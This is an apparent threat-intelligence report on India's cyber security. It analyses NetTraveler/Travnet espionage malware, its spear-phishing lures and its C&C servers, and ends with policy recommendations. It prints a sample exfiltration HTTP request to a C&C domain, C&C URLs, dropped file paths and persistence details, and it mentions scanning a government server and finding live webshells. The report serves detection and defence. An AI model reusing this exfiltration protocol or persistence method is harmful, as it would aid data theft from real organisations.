While the ' Hangover ' report itself has been widely debated in the Indian Information Security community , there is little proof , beyond circumstantial evidence provided in the Norman report , that Indian actors were behind this APT campaign , and the larger concern remains that India is the victim of numerous APT campaigns , rather than an instigator of this threat .
As our Government is rapidly migrating towards e - governance , it is vital to ensure a robust approach to data security is implemented from an early stage to prevent misuse and subsequent attacks on critical infrastructure and the national economy .
A quick look at India 's history with respect to battling cyber threats , reveals an age- old & on - going war between the `` hackers '' from various Nations .
Defacement of Indian government sites date back to the year 2003 & even today , they continue to happen .
In this report , we analyse the various facts and provide in - depth analysis of an `` Advanced persistent threat '' attack on India that makes us ask – Are we the hunter or the hunted ?  Part one – Hunter or the Hunted ?  Part two – Advanced persistent threat - analysis  Part three - Primary Causes  Part four - Recommendations '' Advanced persistent threat '' or APT as it is known , is a reality today .
Unlike the regular script - kiddie attacks that are carried out usually for fun or for fame , APTs are serious campaigns , undertaken by groups with a variety of skill - sets .
The focus of an APT campaign usually is to gather valuable information against specific companies / organizations or selected sectors of a country .
These usually begin with highly targeted spear - phishing attacks .
Out of 25,935 websites scanned by Google , 14 % websites were infected by Malware .
AS = Attack Sites To make some sense of the current scenario of cyber security in India , let 's have a look at some of the statistics published by CERT - India .
The following table should give us a good idea of how things are shaping up .
It 's not surprising to note that the threats are increasing at an alarming rate , year after year .
In a way , it 's heartening to observe the CERT evolve & rise upto newer challenges & latest threats .
Unfortunately , it 's not enough .
The reports submitted by CERT do not take into account the most fundamental aspects of maintaining a state of secure IT environment .
This fact is evident from the number of security incidents that happen over an year & how the right authorities react to them .
If every reported incident was handled properly by identifying the root cause , followed by a full security audit , we wonder if the numbers would grow so fast .
As mentioned earlier , cases of government sites being defaced date back to 2003 .
Even today , one can find servers running older & vulnerable versions of software , poor server management , web applications deployed on these servers being designed & implemented by programmers who lack awareness of secure coding practices , to name a few .
The private sector though , is much more cautious & alert when it comes to their IT infrastructure compared to the government .
Let 's analyse the state of government 's IT infrastructure in the following pages .
While the statistics presented by CERT - In looks alarming by itself , the actual state of domains that end with '' gov.in '' , is much worse .
A quick look at the following recent screenshot of www.zone-h.org site provides some shocking insight .
According to the site , the current statistics are as follows : Total Notifications : 1299 Mass defacements : 753 A recent incident that caught our attention was the `` Travnet '' case .
We carried out a preliminary analysis of our own on the subject .
Kaspersky as well as McAfee amongst others , have published detailed analysis of the malware & the campaign .
Our focus was to understand the nature of the group behind the attack & its agenda .
It began with Kaspersky 's revelation of the attack .
We recommend you to go through Kaspersky & McAfee 's analysis of the malware to know more about the spear phishing campaign & the exploits used .
Our analysis is currently focussed only on the malware samples that are dropped on the target systems , as the exploits used during the spear - phishing campaign are older & already patched by the respective vendors .
To summarize the modus operandi of the attack , targeted phishing mails were sent to individuals , having Office documents as attachments .
These documents exploited previously known vulnerabilities ( CVE-2012 - 0158 and CVE-2010 - 3333 ) to drop `` Travnet '' malware onto the systems .
Its fascinating to note that the attachments that were sent to Indian targets were carefully selected & some of them were named as follows :  `` Army Cyber Security Policy 2013.doc ''  `` Jallianwala bagh massacre a deeply shameful act.doc ''  `` Report - Asia Defense Spending Boom.doc ''  `` His Holiness the Dalai Lama 's visit to Switzerland day 3.doc ''  `` BJP wo n't dump Modi for Nitish NDA headed for split.doc '' As its evident , the group behind the attack obviously has done extensive research on topics that are current as well as intriguing to the Indian targets .
We managed to acquired 2 variants of the `` Travnet '' malware & our analysis of the same is as follows .
File details : A quick analysis by PEiD reveals that the binary is not packed or protected .
It begins by creating a new mutex object , named `` INSTALL SERVICES NOW ! '' .
Next step is to create a configuration file named `` config_t.dat '' in the windows ' `` system '' folder .
It then populates it with the right parameters , after decoding them .
After the configuration file is written , it checks if the malware was previously installed or not , if not , it creates a dynamic - link library in the `` system32 '' folder , creates a temporary batch file named as `` temp.bat '' which installs the previous DLL as a service on the system .
The name of the DLL that is created , is based upon the values of the data from `` netsvcs '' from the following registry key : `` HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost '' .
During this runtime , it turned out to be `` 6to4ex.dll '' but it can change from runtime to runtime . The malware then deletes the batch file .
Its obvious that this executable basically acts as a dropper .
The contents of the batch file & the configuration file generated are as follows .
Batch file : temp.bat Configuration file : config_t.dat Next section focuses on the analysis of the DLL ( `` 6to4ex.dll '' ) that was dropped by this executable .
Analysis of `` 6to4ex.dll '' File Details A quick analysis by PEiD reveals that the binary is not packed or protected .
Now , as we know already , this DLL was installed as a service by the previous dropper .
Analysis of the '' ServiceMain '' function of the DLL throws light on many interesting things .
The first thing it does upon execution is to create a new mutex object named `` NetTravler Is Running ! '' .
Its usually done to avoid running multiple instances of the same malware .
Next , it reads the configuration file .
Additionally , it also creates few interesting files in the `` system32 '' folder .
The filenames are quite indicative of what their contents might be .
`` enumfs.ini '' as the name suggests , is a complete list of all files and folders on the computer .
`` dnlist.ini '' seems to be noting down the date & time .
`` system_t.dll '' on the other hand , contains a broad category of sensitive information about the computer like the `` Computer Name '' , Windows version , IP address , list of running processes , network information & so on .
The contents of the files are as follows Filename : `` system_t.dll '' Upon proper character encoding & use of google 's Translate feature , it turns out to be `` Chinese '' .
Filename : `` enumfs.ini '' Filename : `` dnlist.ini '' Another interesting aspect of Travnet is that it can specifically search for files of the type `` doc , docx , xls , xlsx , txt , rtf , pdf '' on the victim machine .
This provides enough hint that this malware was designed to steal confidential information unlike the usual botnet variants that focus primarily on providing remote access to the system or to act as zombies for launching DDOS attacks .
To summarize , the Travnet malware initially collects system information , a list of files on the victim machine among others , then sends this data to the remote Command & Control ( C & C ) server , by using custom compression & encoding functions .
The malware creates a new file with the naming convention as follows : '' travlerbackinfo- % d- % d- % d- % d- % d.dll '' , where the signed integer values are replaced by the current system date & time , copies the content of `` system_t.dll '' into it & then , uploads it to the C & C .
It also uploads the list of files found on the victim machine , which was saved in the `` enumfs.ini '' file to the remote server , by copying its contents to a new file , named following this format : `` FileList- % 02u % 02u- % 02u % 02u % 02u.ini '' It does n't stop at that , it even uploads the victim 's files onto the remote C & C that have the file extensions `` doc , docx , xls , xlsx , txt , rtf , pdf '' as well as the files on the victim 's desktop folder .
Another important aspect of Travnet is the fact that it uses a custom compression & encoding algorithm on the data collected , before its sent to the remote C & C .
A typical file upload communication between the bot & the C & C looks like this : An actual HTTP GET request looks like this : '' http : //www.newesyahoo.com / traveler1/net / nettraveler.asp ? hostid=00CD1A40 & hostname = ComputerName & ho stip=127.0.0.1 & filename = FileList-0523- 131103.ini & filestart=0 & filetext = begin : : RgAxAC2QzebTgdToZTkXQaCicYTaZR72HWSigYTPHjEZDUZTvgBrOEmQ0 nIxm86m46D0YTg * : : end '' Here , the data between `` begin : : '' & `` : : end '' is the actual file content , that was compressed & encoded by the bot .
It seems that this older variant of the Travnet malware supported 4 different types of commands from the remote C & C and they are as follows :  UNINSTALL  UPDATE  RESET  UPLOAD That concludes Part - A of our Travnet analysis .
File details : A quick analysis by PEiD reveals that the binary is not packed or protected .
This executable is apparently an updated variant of Travnet .
The major changes are as follows :  It 's an executable & not a DLL .
 The compression algorithm has been modified .
 It tries to install itself on the victim machine to achieve persistence instead of dropping other payloads .
 Supports just 2 instructions from the C & C instead of 4 , like in the previous version .
Apart from these , there is n't much difference .
The following analysis only focuses on what has changed .
It achieves persistence by copying itself to the currently logged - in user 's `` temp '' folder as `` csmss.exe '' & placing a shortcut to it , named as `` seruvice.lnk '' in the `` startup '' folder .
The next step it to create a new mutex object to avoid running multiple instances .
It names the mutex as '' Assassin '' .
After this , it generates a unique 8 characters long `` hostid '' , based on volume serial number to identify the bot .
This is common to the previous variant too .
Then it checks if the victim machine is connected to the internet or not , by trying to resolve `` smtp.live.com '' & if that fails , as a second attempt , `` smtp .. yahoo.com '' .
The strings displayed above , are actually in `` Chinese '' & turn out to be :  `` You can connect to the network .
''  `` Unable to connect to the network .
'' Unlike the previous variant , this one does n't seem to collect sensitive information about the victim machine .
It just makes a list of all files & folders on the victim machine & dumps it into a file named as '' AllIndex.ini '' .
Next step is to compress the contents of this file , copy the compressed content to a new file named as `` AllIndex.ini_d '' & then delete the previously created clear - text file .
The contents of both the files are as follows : Filename : AllIndex.ini Filename : AllIndex.ini_d It 's pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following image : Apart from that , this variant also creates a file that lists all the currently running processes on the victim machine , into a text file named `` Process.dll '' inside the currently logged - on user 's `` temp '' folder .
This variant also uses a modified naming convention to upload files onto the remote C & C .
The only other major difference from the previous variant is the fact that this one only supports 2 commands from the remote C & C server , instead of 4 & they are as follows :  Uninstall  Upload The C & C server in case of this variant was located at : `` http : //www.viprambler.com / newsinfo / uld / nettraveler.asp '' Apart from analyzing the malware samples , we also tried to gather as much information about the C & C servers as we could .
The fact that even after a lot of research papers being published on the analysis of the Travnet malware , some of the C & C servers are still active & functioning , is noteworthy .
We were able to locate a few of them .
The ones that caught our attention are currently hosted on these domains :  www.pkspring.net  www.viprambler.com Let 's start with the analysis of `` www.viprambler.com '' .
WHOIS record for the domain currently is as follows : Registrant information for the domain is as follows : Our analysis strongly suggests that the group behind Travnet might be from China .
The above record is just one of the findings that supports the claim .
Its interesting to note that the domain was recently registered , is locked & expires in 2014 .
Another interesting observation is the address of the registrant .
`` Guangdong '' province from China seems to pop up everywhere .
Its also noteworthy that the domain is still active & still hosting the Travnet C & C .
We ' ve also observed that the C & C now remains active only during specific time of the day .
The time - stamp from the images below , confirms this .
Active response from the C & C : C & C server refusing connection later on the same day : Its obvious that even after the discovery of the malware , the group behind this specific attack is determined to keep it alive .
The Travnet malware as well as its C & C infrastructure is constantly evolving .
Lets move onto the next active domain .
The Travnet C & C hosted at `` pkspring.net '' seems to be fully functional & active all the time .
The response from the server when opened from a browser is as follows : Another interesting finding is the fact that it hosts Travnet C & C on 3 different ports on the server .
They are as follows :  80  443  8080 Its evident from the following pictures .
Port 443 Port 8080 Moving on , we found out that 21 domains are hosted on the same server at the moment .
And all of them are active C & C servers for the Travnet malware .
They also seem to have interesting domain names .
Its an indication of the seriousness of the campaign .
Other domains hosted & owned by the same group on the same server / IP : The image below proves that all of the above domains serve the same Travnet C & C on the same 3 ports , each .
After this , we focused our attention on the WHOIS details of these domains .
At the moment , the details of the registrant is kept private & it was recently updated .
Its also interesting to note that the group behind this has ensured that the domain can not be taken over by someone else .
The following page contains the current WHOIS data for the domain .
`` Pkspring.net '' WHOIS data ( Recent ) Registrant details for the domain : Nothing much to go on there at the moment .
But thanks to older WHOIS records , we found out some interesting facts .
The same domain was earlier registered as follows : It was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013 .
The registrant 's information at that time was as follows : The above data seems familiar .
The only difference now being that the domains have be renewed , registration details kept private & the email ID of the registrant has changed from `` livep92 @ hotmail.com '' to '' chenjm @ sina.com '' , which belongs to a private Chinese mail service ( http : //mail.sina.com.cn/ ) .
The same thing has happened with other publicly disclosed Travnet C & C domains .
We also fetched details of another domain that previously hosted Travnet C & C & has been recently renewed , most likely by the same group .
A search for the email `` livep92 @ hotmail.com '' led us to the following page : The above listed domains are already known to have hosted the Travnet C & C .
We did some research on the current status of one of the domains from the above list , `` discoverypeace.org '' .
The current WHOIS data for the domain `` discoverypeace.org '' is as follows : This looks strikingly similar to the current status of the active C & C domain `` pkstring.net '' .
It was also recently updated .
The older WHOIS entry for the same domain was as follows : From our analysis of the Travnet malware so far , it 's quite evident that many things hint at the origin of this campaign to be from China .
It 's also a known fact the Indian government & other important sectors from India were heavily targeted during this campaign .
T The fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive information makes it noteworthy .
What are the primary causes of weak Indian Cyber Space ? Another interesting finding is the fact that many of the servers that host `` gov.in '' sites are running outdated software versions .
As an example , from the above image , it is evident that the domain `` karnataka.gov.in '' is hosted on a server running '' Windows Server 2003 '' , on 22-June-2013 .
To confirm this , we ran an nmap scan & it 's not surprising to find out that the information is true .
The screenshot of our nmap scan is as follows : While use of outdated software is one of the major concerns , it seems most of the Indian government sites are riddled with vulnerable code too .
It 's quite common to locate webshells on these sites .
One of the many live webshells we found recently during our analysis is shown in the following image : From the time - stamps on the above image , it 's evident that this is webshell is still active at the time of this this writing .
An example of a government site that 's not properly managed & discloses highly sensitive information is as follows : The above screenshot is just one of the many live examples of poorly managed web servers that do not follow even the most basic web application security guidelines .
Even important government sites , access to which can lead to much deeper intrusion seem to be managed with little care .
The following image is just one of the examples of developing or customizing a CMS & not properly handling access - control .
While defacements are usually carried out by hackers just for fun or fame , in a way its a boon in disguise .
Serious hackers can cause much more damage & remain unnoticed for a very long time by having access to the privileges these hackers abuse to deface the site .
Slowly but steadily , serious APT campaigns are on the rise .
Its very important for the nation to start upgrading its IT infrastructure & keep up with the latest security guidelines & practices .
The next part of this research paper focuses on a recent APT campaign against multiple countries including India was targeted .
While each and every technical cause for weak Indian Cyber space is beyond the scope of this document , we also believe that India requires a strong policy driven approach along with inspiring leadership from thought leaders and Government departments in Information security to bring the much needed change .
We recommend the following The Domain name acquisition , management and maintenance policy should address the process to protect and manage the crucial online identities of Indian Government Domains .
At present there is no consistent policy to acquire and manage the domains .
The policy should address : 1 .
Naming convention to be followed for official Government domains to prevent misuse by domain squatters 2 .
A Government body that is responsible to register , administer and manage the domains 3 .
Consistent working administrative and management contacts for WHOIS query 4 .
Systematic policy to acquire domains and renew them on timely basis 5 .
A policy to ensure `` Domain Authorization keys '' are managed properly and maintained in proper chain of custody , secured in a bank locker and handled with systematic process It is crucial to select the right vendors for developing security websites and web applications for all Government projects .
The policy should address : 1 .
Qualification parameters for selection of vendor for web site and web application development 2 .
Certified Staff by vendor working on Government projects for Information security and secure coding 3 .
Quarterly vulnerability assessment and penetration testing of all websites 4 .
Security Classification of websites that determine parameters of vendor approval 5 .
Comprehensive development and support contract from vendor that covers data security and associated penalties in event of breach While it is possible that such a policy exits with organizations such as NIC , it is important to ensure these are implemented in a timely manner .
The policy on patch management must ensure outdated software must be secured appropriately and updated as per Industry standards .
The policy must address : 1 .
Adequate test bed environment for testing new updates for software , patches etc 2 .
Comprehensive UAT ( User Acceptance Testing ) before implementation of critical security patches 3 .
Policy to ensure critical security updates are deployed within a specified time from date of release 4 .
Backup of data and roll back methodologies in event of patch deployment issues 5 .
Monitoring of critical updates and patches and appropriate classification of the same for deployment India has a strong community of Information security experts who can support the Indian Government and strengthen overall security of our cyber space .
As the nature of such community is dynamic and rapidly evolving , it is important for the Indian Government to setup a policy and process for responsible full disclosures when Indian citizens report possible vulnerabilities in critical digital assets of India .
These must address : 1 .
Process by which any citizen of India can safely submit and report vulnerabilities , full disclosures in Indian websites to an authorized agency without fearing action of IT Act law 2 .
Guidelines under which , the security experts from the Indian community can communicate , assist and support law enforcement and responsible agencies in effectively addressing security gaps in Indian Cyber space .
3 .
Process to act on security incidents reported by the security community in a timely manner .
4 .
Guidelines to industry at large on how to cooperate with security experts who disclose security issues in their organizations 5 .
Guidelines to the citizens on being Cyber aware and how to help the Government in securing the economy of the country from malicious hackers National Security Database ( NSD ) is a prestigious empanelment program awarded to credible & trustworthy Information security experts with proven skills to protect the National Critical Infrastructure & economy of the country .
The National Security Database project has been generously endorsed and supported by NTRO and CERT and has been playing an important role in raising the cyber safety awareness across the Nation as well as engaging the community in improving the overall cyber space of India .
We sincerely believe that in coming years , the program will create a strong and credible cyber workforce that can help the Indian Government in both offense and defence of its Cyber Space .
This report describes multiple cyber - espionage campaigns that have successfully compro- mised more than 350 high profile victims in 40 countries .
The focus of the paper is to describe NetTraveler , which is the main tool used by the threat actors during these attacks .
The name `` NetTraveler '' comes from an internal string which is present in early versions of the malware : `` NetTraveler Is Running ! '' .
This mal- ware is used by APT actors for basic surveillance of their victims .
Earliest known samples have a timestamp of 2005 , although references exist indicating activity as early as 2004 .
The largest number of samples we observed were created between 2010 and 2013 .
Known targets of NetTraveler ( also known as ' Travnet ' or `` Netfile '' ) include Tibetan / Uyghur activists , oil industry companies , scientific re- search centers and institutes , universities , private companies , governments and govern- mental institutions , embassies and military con- tractors .
The NetTraveler backdoor is often used together with other malware families .
During the anal- ysis of one of the command and control ( C & C ) servers , we observed how the attackers de- ployed different backdoors to the victims ' ma- chines .
These include the malware known as '' Saker '' also known as `` Xbox '' ( known filenames : '' update.exe '' , `` updata.exe '' or `` xbox.exe '' ) and '' PCRat '' / `` Zegost '' .
This report includes a full description of the `` Saker / Xbox '' backdoor as well .
The attacks use spear - phishing e - mails with malicious Microsoft Office documents as attach- ments .
Gathered data includes file system list- ings , keylogs , various types of documents ( .doc
, .xls
, .ppt
, .pdf
, etc ...
) and other private informa- tion .
We have calculated the amount of stolen data stored on C & C servers to be 22 + gigabytes .
However this data represents only a small frac- tion which we managed to see - the rest of the it had been previously downloaded and deleted from the C & C servers by the attackers .
NetTraveler victims get infected through spear - phishing attacks using Office documents which exploit two publicly known vulnerabilities -- CVE-2012 - 0158 and CVE-2010 - 3333 .
Although these vulnerabilities have been patched by Microsoft , they remain effective and are among the most exploited in targeted attacks .
During our analysis , we did not see any advanced use of zero - day vulnerabilities or other malware techniques such as rootkits .
It is therefore surprising to observe that such un- sophisticated attacks can still be successful with high profile targets .
We are listing below several NetTraveler spear - phishing examples observed during the course of this investigation This spear - phish targeted CVE-2010 - 3333 , a very popular vulnerability exploited in many attacks .
The development of this version of the exploit delivers a large , easily identified '' 0x4141 '' NOP sled prior to its shellcode , shed- ding some light on the immaturity of the devel- opment behind the effort .
More interesting is that the target in India received this file titled '' Army Cyber Security Policy 2013.doc '' , and the accompanying benign and empty decoy Word document is dropped to the temp folder and opened with Word as `` Jallianwala Bagh massacre a deeply shameful act.doc '' ( MD5 : e617348b8947f28e2a280dd93c75a6ad ) .
The exploit drops > > % temp % \netmgr.dll > > % temp % \netmgr.exe > > % temp % \perf2012.ini > > % temp % \sysinfo2012.dll > > % temp % \winlogin.exe The malware command and control server script is at `` hxxp : //www.faceboak.net/2012nt/ nettraveler.asp '' .
Filename : `` invitation.doc '' Decoy filename : `` mailnew.doc '' ( empty ) Drops : > > % temp % \netmgr.dll > > % temp % \netmgr.exe > > % temp % \perf2012.ini > > % temp % \enumfs.ini > > % temp % \dnlist.ini > > % temp % \sysinfo2012.dll > > % temp % \winlogin.exe Filename : `` Report - Asia Defense Spending Boom.doc '' Decoy filename : `` Report -- Asia Defense Spend- ing Boom.doc '' ( empty ) ( MD5 : e617348b- 8947f28e2a280dd93c75a6ad ) Drops : > > % windir % \system\config_t.dat > > % windir % \system32\enumfs.ini > > % windir % \system32\dnlist.ini > > % windir % \system32\Iasex.dll > > % windir % \system32\system_t.dll E - mail spear - phishing sample entitled `` His Holi- ness the Dalai Lama 's visit to Switzerland day 4 '' .
Attachment filename : `` His Holiness the Dalai Lama 's visit to Switzerland Day 3.doc '' Decoy filename : `` His Holiness the Dalai Lama 's visit to Switzerland Day 3.doc '' Drops : > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\perf2012.ini > > % AppData % \Adobe\sysinfo2012.dll > > % AppData % \Adobe\enumfs.ini > > % temp % \winlogin.exe Filename : `` BJP wo n't dump Modi for Nitish NDA headed for split.doc '' Decoy filename : `` BJP wo n't dump Modi for Nitish NDA headed for split.doc '' Drops : > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\perf2012.ini > > % AppData % \Adobe\sysinfo2012.dll > > % AppData % \Adobe\enumfs.ini > > % temp % \winlogin.exe Filename : `` Activity Details.doc '' Decoy filename : `` Activity Details.doc '' ( empty ) Drops : > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\perf2012.ini > > % temp % \winlogin.exe files .
Filename : `` Fax13 - 0417.doc '' Decoy filename : `` Fax13 - 0417.doc '' ( empty ) Drops > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\perf2012.ini > > % AppData % \Adobe\sysinfo2012.dll > > % AppData % \Adobe\enumfs.ini > > % temp % \winlogin.exe Filename : `` The Prayer.doc '' Decoy filename : `` Freedom of Speech.doc '' ( empty ) Drops > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\ie.log > > % AppData % \Adobe\perf2012.ini > > % temp % \winlogin.exe Filename : `` 23948-report.doc '' Decoy filename : `` Report.doc '' ( empty ) Drops > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\enumfs.ini > > % AppData % \Adobe\perf2012.ini > > % temp % \winlogin.exe Filename : `` Alban Tushaal Jagsaalt.doc '' Decoy filename : `` document.doc '' ( Mongolian text ) Drops > > % temp % \smcs.exe > > % windir % \system\config_t.dat > > % windir % \system32\6to4ex.dll > > % windir % \system32\svchost.log Filename : `` data.xls '' ( empty decoy ) Drops : > > % temp % \enumfs.ini > > % temp % \sysinfo2012.dll > > % temp % \dnlist.ini > > % temp % \netmgr.dll > > % temp % \perf2012.ini > > % temp % \netmgr.exe NetTraveler is an automatic data exfiltration tool , designed to extract large amounts of private information from the victim 's system over long periods of time .
The malware uses compression techniques and a fail - safe protocol to ensure that uploaded data is safely transferred to the attacker 's C2s .
By default , NetTraveler exfiltrates common file types such as DOC , XLS , PPT , RTF and PDF .
For a full list , see the detailed backdoor analysis below .
The backdoor configuration can however be extended with special options to steal other file types .
Here 's one such extended configura- tion recovered from an attack against a victim working in the oil industry : It is clear that the attackers are also collecting files of type `` .cdr
'' ( Corel Draw designs ) , `` .dwg
'' , '' .dxf
'' , `` .cdw
'' , `` .dwf
'' ( AutoCAD projects ) and some configuration files `` .cfn
'' and `` .cfg
'' .
The various parameters of the malware are configured with a builder , which allows the attackers to change things such as the list of stolen files extensions , C2 address and so on : Exfiltrated data is encoded with a custom compression and encoding library , which pro- duces files which resemble BASE64 .
The data is transferred to the command and control servers via HTTP requests such as : Note : for our analysis of the Red October cam- paign , see : https : //www.securelist.com / en/ blog/785/The_Red_October_Campaign_An _ Advanced_Cyber_Espionage_Network_Target- ing_Diplomatic_and_Government_Agencies During our analysis of NetTraveler infections , we identified several victims that were infected both by NetTraveler and Red October .
Although we see no direct links between the NetTraveler attackers and the Red October threat actor , the existence of victims infected by both of these campaigns is interesting .
These victims are : > > A Military Contractor in Russia > > An Embassy in Iran > > An Embassy in Belgium > > An Embassy in Kazakhstan > > An Embassy in Belarus > > A Government entity in Tajikistan These infections indicate that certain high profile victims are targeted by multiple threat actors ; the target information is a valuable commodity .
To better identify core NetTraveler actors and delineate the groups from one another , we collect and categorize various Tactics , Techniques , and Procedures ( TT Ps ) employed by these adversaries throughout their operations .
The attacker 's IP operation ranges , overlaps with that of a malware family known as `` Zegost '' .
For instance , one of the command and control servers that is part of the infrastructure , is a well - known C2 for multiple Zegost variants , still active as of May 2013 .
The targets and command and control domain naming scheme indicates a connection between the Lurid / Enfal attackers and NetTraveler .
Some of the NetTraveler C2 's are used to distribute a malware known as `` Saker '' or `` Xbox '' , which is delivered as an `` update '' to the NetTraveler victims .
Note : more details about the connections between NetTraveler and other campaigns is available in our private report .
Contact us at intelreports @ kaspersky.com for more details .
During our monitoring period , we observed more than 100 command and control URLs , pointing to multiple servers in the United States , China and Hong Kong .
The command and control servers generally run IIS 6/7 , as the C2 backend is an ASP ( Microsoft Active Server Pages ) script .
To transfer stolen data from the command and control servers , the attackers use FTP on top of VPN connections through a server in the US hosted by Krypt Technologies .
The infrastructure is secured by allowing FTP access only to remote users coming from predefined IPs , including the VPN provider in the US .
During our investigation , we analyzed several hundred NetTraveler samples and configuration files , which use more than 30 different C & C serv- ers .
The list below includes the script names that we have seen on these servers and confirmed as malicious : All the known command and control servers perform the same basic functions - for a description of the supported functionality , see below .
The main function of Command and Control servers is to collect stolen data from the victims .
Stolen data is stored in the exact format it was sent from the victim 's PC , without any additional encoding or obfuscation .
Here 's a listing of how a folder storing stolen victim data could look on the C & C server : The uploaded data can be either a document file , a keylogger backlog or a system infor- mation profile .
Here 's how a decoded system information profile looks like : The system profile includes an IPCONFIG output as well as a list of user accounts in the machine .
If the malware install includes the `` NetPass '' module , a keylogger will silently collect all typed data , together with window names .
This produces logs like the following ( in decoded format ) : The command and control scripts implement several functions to communicate with the victim ; during our analysis , we observed four different generations of these scripts , with various degrees of complexity .
The main function of the C & C script saves stolen data to a folder in the C2 root , unless the request variable `` action '' is defined , in which case , it performs one of the following commands : The Command and control scripts reply to the victim with either `` Success : < size > '' or `` Fail ! `` , de- pending on the result of the operation .
In some cases , instead of the `` Fail '' string , a more de- tailed error is sent back to the victim , in Simpli- fied Chinese : Under normal operation , a victim can connect to the C2 every five seconds and upload chunks of data from the victim , until the entire file is successfully transferred .
In case of errors , the malware continues to send the data over and over , until they succeed .
During our analysis , we obtained infection logs from several command and control servers .
The logs , which go back as far as 2009 , show that the threat actors behind NetTraveler successfully infected more than 350 victims in 40 countries .
The following map shows the locations and profile of the victims : The following map lists the victim profiles by industries : In addition to the data from the Command and Control servers , we collected statistics regarding detections of NetTraveler from the Kaspersky Security Network .
The top 10 infected coun- tries as reported in KSN ( Kaspersky Security Network ) : Besides the C & C logs and KSN , we have also sinkholed two of the C & C domains used by NetTraveler : The data set collected so far from the sinkhole is relatively small and includes victims in Mongolia , South Korea and India .
We will continue to monitor the connections and over time , update this paper with more data as it becomes available .
Note : Taking into account that several other C & C servers exist for which we have no logs and the KSN coverage , we estimate the total number of victims worldwide to be around ~1,000 .
From the point of view of the victims , the most important part of any report is information on how to detect and eradicate the infections .
In addition to running a modern security suite ca- pable of detecting NetTraveler , things such as filenames or C2 IPs can be extremely useful to system administrators .
This part of the report includes : Detection names for the malware modules and related files : Kaspersky detection names for malicious documents with embedded exploits used in spear - phishing attacks : Spear - phishing samples MD5s : Malware modules : During our analysis , we describe NetTraveler , a malicious data exfiltration tool used by a me- dium - sized threat actor group from China .
The main targets of the group include government institutions , embassies , oil and gas industry , research institutes , universities , private com- panies , military contractors and activists .
The group 's domains of interest include space ex- ploration , nanotechnology , energy production , nuclear power , lasers , medicine and communi- cations between others .
Although not very advanced , the NetTtraveler attackers have successfully compromised hun- dreds of targets around the world , with the high- est number in Mongolia , India and Russia .
The group using NetTraveler is also employing other malware , including Zegost , Saker and oth- ers .
To compromise their victims , they rely on exploits for two popular vulnerabilities in Mic- rosoft Office .
Based on collected intelligence , we estimate the group size to about 50 individuals , most of which speak Chinese natively and has knowledge of English language .
By publishing this report we would like to raise awareness of all organizations and individuals who might become a victim of these attackers .
We would like to encourage people of all coun- tries to learn something from this report , check their systems and be prepared for potential fu- ture cyberattacks against them .
More information on attribution and victims will be available to selected parties , including lo- cal authorities of victim countries .
For details , please contact us at intelreports @ kaspersky .
com .
The module is a Win32 PE executable file com- piled in Microsoft Visual C++ 6.0 .
Its main pur- pose is to drop a DLL file and register it as a sys- tem service .
The malware looks up a suitable service name from one of the values in the reg- istry .
This module also drops an INI - type file with the configuration that is later used by the NetTrav- eler backdoor .
Execution of the module starts with the creation of a system mutex object called `` INSTALL SER- VICES NOW ! '' .
If this mutex already exists the module quits to avoid duplicate instances of the same module from running .
After that , the module creates the configura- tion file named % WINDIR % \system\config_t.dat which is populated with the strings embedded in the body of the executable and encrypted with simple one - byte XOR ( 0x3E ) .
The config_t.dat is an INI - type file which contains the module configuration shown below : The WebPage parameter 's maximum length is 128 bytes and represents a URL for the Com- mand and Control server ( C & C ) .
DownCmdTime is the delay in minutes between requests sent to the C & C server .
The code of the function to dump the INI file is designed to process several cases .
There is 1 byte value for variable UP ( which stands for '' Use Proxy '' ) from section [ Other ] .
If that value is set to 1 ( absolute file offset 0x334 ) then the INI file section [ Other ] will be populated with the following values : The purpose of PS , PP , PU , PW , PF parameters is the following : The module then queries registry value at HKLM\SOFTWARE\Microsoft\Windows NT\\CurrentVersion\Svchost\netsvcs which is a multi - string type of value .
Then it iterates through the names of services in that value to find a special service name .
It must not be the '' 6to4 '' service and there must not be registry key HKLM\SYSTEM\CurrentControlSet\Ser- vices\ < servicename > .
On Windows XP services that match the de- scribed criterias are ( eg .
) `` Ias '' , '' Iprip '' , `` Irmon '' and a few others .
These names are different on other Windows OS and even depend on installed features or Service Packs .
The malware takes the first matching service name and uses it .
Right after that , the malware attempts to delete % WINDIR % \system32\ < servicename > ex .
dll and registers a new system service with the same name < servicename > .
The service is designed to be a Win32 shared process like svchost , autostarted by system service control manager during system boot .
That creates cor- responding system registry values in HKLM\ SYSTEM\CurrentControlSet\Services\ < ser- vicename > .
After that it saves to local directory and executes the following batch file ( net.bat ) : Note that < servicename > is replaced with the actual system service name that was previously found .
After that the module creates the C : \WIN- DOWS\system32\ < servicename > ex.dll file on disk and sets hard - coded file creation and last access date and time to `` 20:00 17 August 2004 '' .
The new file is then filled with data produced after decryption of the hard - coded data block .
The malware is Win32 PE DLL file compiled in Mi- crosoft Visual C++ 6.0 .
It has one export function ServiceMain which has the main functionality of the module .
This module has initial filename assigned during compilation : `` DLL.dll '' .
Upon start the module sets corresponding ser- vice status to `` Start_Pending '' and then imme- diately to `` Running '' .
It checks if system mutex named `` NetTravler Is Running ! '' exists and terminates if that is true .
